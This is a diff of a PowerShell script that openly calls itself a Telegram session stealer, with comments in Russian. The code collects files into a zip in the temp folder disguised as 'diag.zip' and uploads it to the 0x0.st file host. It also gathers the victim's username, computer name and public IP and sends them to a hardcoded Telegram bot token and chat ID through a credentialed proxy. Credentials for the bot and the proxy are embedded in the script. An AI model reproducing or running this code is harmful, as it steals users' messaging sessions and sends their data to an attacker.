@@ -1,11 +1,11 @@
 # ============================================================
-# Telegram Session Stealer + 0x0.st + Global Proxy
+# Telegram Session Stealer + 0x0.st + Глобальный прокси
 # ============================================================
 
 $botToken = "8865169520:AAGWKCEINgQtP2Jtd3783tkOx-V2Uhq8D3A"
 $chatId   = "8620709143"
 
-# Настройка глобального прокси (действует для всех WebRequest)
+# Глобальный прокси – работает для всех WebRequest, включая WebClient и Invoke-WebRequest
 $proxy = New-Object System.Net.WebProxy("http://gate.proxydata.ru:3129", $true)
 $proxy.Credentials = New-Object System.Net.NetworkCredential("user-xpx93ax5", "5pxp942ldb7jtnh2")
 [System.Net.WebRequest]::DefaultWebProxy = $proxy
@@ -17,7 +17,6 @@ function Send-TelegramMessage {
     $body = @{ chat_id = $chatId; text = $text } | ConvertTo-Json -Compress
 
     $wc = New-Object System.Net.WebClient
-    # WebClient использует глобальный прокси по умолчанию
     $wc.Encoding = [System.Text.Encoding]::UTF8
     $wc.Headers.Add("Content-Type", "application/json; charset=utf-8")
 
@@ -51,7 +50,6 @@ function Send-TelegramMessage {
 function Upload-To0x0 {
     param($filePath)
     $wc = New-Object System.Net.WebClient
-    # Использует глобальный прокси
     try {
         $response = $wc.UploadFile("https://0x0.st", "POST", $filePath)
         return [System.Text.Encoding]::UTF8.GetString($response).Trim()
@@ -92,9 +90,10 @@ try {
     $zip = "$env:TEMP\diag.zip"
     Compress-Archive -Path $paths -DestinationPath $zip -Force
 
-    # 4. Сбор информации (глобальный прокси уже установлен)
+    # 4. Сбор информации
     $user = $env:USERNAME
     $comp = $env:COMPUTERNAME
+    # Invoke-WebRequest автоматически использует глобальный прокси
     $ip = (Invoke-WebRequest -Uri 'https://api.ipify.org' -UseBasicParsing).Content.Trim()
     $caption = "$user@$comp | IP: $ip"
     $size = (Get-Item $zip).Length
